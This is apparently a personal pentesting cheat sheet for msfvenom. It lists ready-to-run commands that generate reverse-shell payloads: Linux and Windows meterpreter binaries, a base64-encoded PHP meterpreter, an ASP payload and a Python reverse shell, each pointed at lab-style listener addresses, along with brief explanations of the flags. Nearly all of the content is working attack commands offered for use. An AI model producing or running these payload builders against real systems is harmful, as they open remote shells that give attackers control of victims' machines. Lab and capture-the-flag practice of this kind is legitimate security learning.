---
title: "msfvenom"
tags:
  - fetus
---
## web venom builder:
- https://pentest.ws/tools/venom-builder
## usage:
```sh
msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell.elf LHOST=10.14.110.172 LPORT=4444
```
- `-p`: sets the payload
	- `msfvenom --list payloads` to see payloads available
- `-f`: sets the file type
- `-o`: specifies the output name
- `LHOST` and `LPORT` are self explanatory tbh :v
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe -o rev_shell.exe
```

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp -o rev_shell.asp
```

```sh
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw -o rev_shell.py
```
## notes 
- `msfvenom -l payloads` to see all payloads with descriptions
- `msfvenom --list formats` to see supported output formats 
- 